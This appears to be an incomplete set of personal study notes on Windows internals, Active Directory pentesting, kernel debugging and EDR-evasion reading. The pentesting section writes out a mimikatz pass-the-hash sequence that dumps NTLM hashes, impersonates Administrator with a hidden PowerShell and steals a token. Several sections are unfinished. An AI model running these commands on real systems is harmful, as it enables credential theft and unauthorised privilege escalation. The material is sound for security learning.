# Windows Host security features

# Security in AD network

# Windows related
### Process monitoring
Useful for trackig filesystem, Process, Threads, DLL activity


# Active Directory and Windows Pentesting
### User impersonation
- **PassTheHash**    - Dump NTLM hashes ```lsadump::sam```, now Impersonate a user ```mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"```, now migrate to the new created process as the impersonated user ```steal_token 1234```
- **PassTheTicket**  - ?????????????????????
- OverPassTheHash    -  

# Debugging Kernel
Steps
* Enable kernal debugging and get key - ```bcdedit debug on``` ```bcdedit net hostip:192.168.0.101 port:55xxx``` ```bcdedit /dbgsetting net hostip:192.168.0.101 port:55xxx```
* Now open windbg -> Attach kernel -> enter port and the key from above command
* kd>.reload /f - Command to reload symbols

### Windows Operating System Architecture
- https://i.ytimg.com/vi/PuDlDtqfXtk/maxresdefault.jpg
- User mode
    - kernel32.dll, USER32.dll, advapi32.dll, ntdll.dll
- Kernel mode
    -  ntoskrnl.exe, hal.dll, win32k.sys 
1. Inturrupts
- Trap - Interrupts

# EDR bypass and malware developement
- Evading EDR Book- https://learning.oreilly.com/library/view/evading-edr
- Grey hat GoLang
